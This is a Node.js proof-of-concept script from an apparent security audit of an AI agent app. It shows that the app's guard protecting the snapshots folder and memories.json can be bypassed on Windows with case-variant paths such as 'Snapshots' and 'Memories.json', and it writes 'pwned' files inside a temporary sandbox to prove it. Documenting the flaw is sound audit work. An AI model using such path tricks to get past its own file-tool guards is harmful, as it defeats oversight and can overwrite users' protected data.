// PoC-3: protected-paths.ts 在 Windows 上的大小写绕过实证
// 运行: node .agents/audit-poc/poc-3-protected-paths.mjs
// 说明：逐字复刻 src/infra/protected-paths.ts，在真实 NTFS 文件系统上验证：
//       大小写变体路径是否被守卫放行、且实际写入命中受保护对象。

import path from 'node:path';
import fs from 'node:fs';
import os from 'node:os';

// ===== 逐字复刻 src/infra/protected-paths.ts =====
function getUserDir() {
  const override = process.env.CUCKOO_HOME;
  return override ? override : path.join(os.homedir(), '.cuckoo');
}
function isProtectedPath(absPath) {
  if (!absPath || typeof absPath !== 'string') return null;
  const normalized = path.resolve(absPath);
  const snapshotsDir = path.resolve(path.join(getUserDir(), 'snapshots'));
  const memoriesFile = path.resolve(path.join(getUserDir(), 'memories.json'));
  if (normalized === snapshotsDir || normalized.startsWith(snapshotsDir + path.sep)) {
    return '快照存档目录（受保护，禁止通过文件工具修改或删除）';
  }
  if (normalized === memoriesFile) {
    return '用户记忆数据（受保护，请用 remember/forgetMemory 工具）';
  }
  return null;
}
// ===== 复刻结束 =====

const sandboxHome = path.join(os.tmpdir(), 'cuckoo-audit-' + process.pid);
fs.mkdirSync(path.join(sandboxHome, 'snapshots'), { recursive: true });
fs.writeFileSync(path.join(sandboxHome, 'memories.json'), '[]', 'utf-8');
process.env.CUCKOO_HOME = sandboxHome;

console.log('CUCKOO_HOME =', sandboxHome);
console.log('平台 =', process.platform, '\n');

const cases = [
  { p: path.join(sandboxHome, 'snapshots', 'evil.txt'), expect: '拦' },
  { p: path.join(sandboxHome, 'Snapshots', 'evil.txt'), expect: '★绕过' },
  { p: path.join(sandboxHome, 'SNAPSHOTS', 'evil.txt'), expect: '★绕过' },
  { p: path.join(sandboxHome, 'memories.json'), expect: '拦' },
  { p: path.join(sandboxHome, 'Memories.json'), expect: '★绕过' },
];

console.log('目标路径(相对)'.padEnd(46), '守卫'.padEnd(8), '实际写入后落点');
for (const c of cases) {
  const guard = isProtectedPath(c.p);
  // 模拟 write 工具：守卫放行就真的写进去
  let landed = '';
  if (!guard) {
    try {
      fs.writeFileSync(c.p, 'pwned', 'utf-8');
      // 反向查看：它在哪个真实路径上？
      const base = path.dirname(c.p);
      landed = '写入OK, dir下实际条目=' + JSON.stringify(fs.readdirSync(base));
    } catch (e) {
      landed = '写入失败: ' + e.message;
    }
  } else {
    landed = '(守卫拦截，未写)';
  }
  console.log(
    c.p.replace(sandboxHome, '~home').padEnd(46),
    (guard ? '拦截' : '放行').padEnd(8),
    landed
  );
}

// 验证：受保护目录里是否多了不该有的文件
console.log('\n受保护 snapshots 目录最终内容:', fs.readdirSync(path.join(sandboxHome, 'snapshots')));
console.log('受保护 memories.json 内容:', JSON.stringify(fs.readFileSync(path.join(sandboxHome, 'memories.json'), 'utf-8')));

fs.rmSync(sandboxHome, { recursive: true, force: true });
console.log('\n结论：大小写变体被守卫放行，且在 NTFS 上实际写入/覆盖了受保护对象。');
